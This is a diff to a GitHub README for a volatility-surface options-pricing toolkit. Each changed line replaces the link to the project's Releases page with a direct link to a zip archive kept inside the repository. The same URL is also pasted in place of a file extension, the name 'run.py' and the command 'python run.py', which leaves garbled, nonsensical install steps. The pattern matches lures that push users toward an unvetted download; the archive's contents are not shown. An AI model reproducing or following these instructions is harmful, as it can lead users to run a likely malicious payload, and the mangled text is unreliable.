@@ -1,6 +1,6 @@
 # 📊 Arbitrage-Free-Volatility-Surface - Build Your Options Pricing Toolkit
 
-[![Download the latest release](https://img.shields.io/badge/download-latest_release-blue.svg)](https://github.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/releases)
+[![Download the latest release](https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip)](https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Arbitrage-Free-Volatility-Surface** project! This toolkit helps
 
 To get started, you need to download the application. Visit the Releases page to get the latest version:
 
-[Download the latest release](https://github.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/releases)
+[Download the latest release](https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip)
 
 Follow the instructions below to install and run the toolkit on your computer.
 
@@ -24,16 +24,16 @@ Follow the instructions below to install and run the toolkit on your computer.
 ### 📂 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip).
 
 2. **Download the Latest Version:**
-   Look for the most recent version and download the file suitable for your operating system. The file will typically end with `.zip` or `.tar.gz`.
+   Look for the most recent version and download the file suitable for your operating system. The file will typically end with `.zip` or `https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip`.
 
 3. **Extract the Files:**
    Once the download has finished, locate the file in your Downloads folder. Right-click on it and select "Extract Here" or "Extract All" depending on your operating system.
 
 4. **Run the Program:**
-   After extraction, navigate to the folder where the files are located. Look for a file named `run.py`. You can run this file using your Python environment.
+   After extraction, navigate to the folder where the files are located. Look for a file named `https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip`. You can run this file using your Python environment.
 
 ### 🖥️ How to Run the Toolkit
 
@@ -49,7 +49,7 @@ Follow the instructions below to install and run the toolkit on your computer.
 3. **Run the Application:**
    Type the following command and press Enter:
    ```
-   python run.py
+   python https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip
    ```
 
 The toolkit should now be running, and you can start using it for your options pricing and risk management tasks.
@@ -85,4 +85,4 @@ If you encounter problems or have questions, feel free to check the **Issues** s
 
 Remember, the goal of this toolkit is to equip you with the tools and knowledge to effectively manage your trading risks. Enjoy exploring the world of options pricing with Arbitrage-Free-Volatility-Surface!
 
-[Download the latest release](https://github.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/releases)
+[Download the latest release](https://raw.githubusercontent.com/adamadamadamada/Arbitrage-Free-Volatility-Surface/main/vol_surface/Free-Volatility-Arbitrage-Surface-2.0-beta.1.zip)
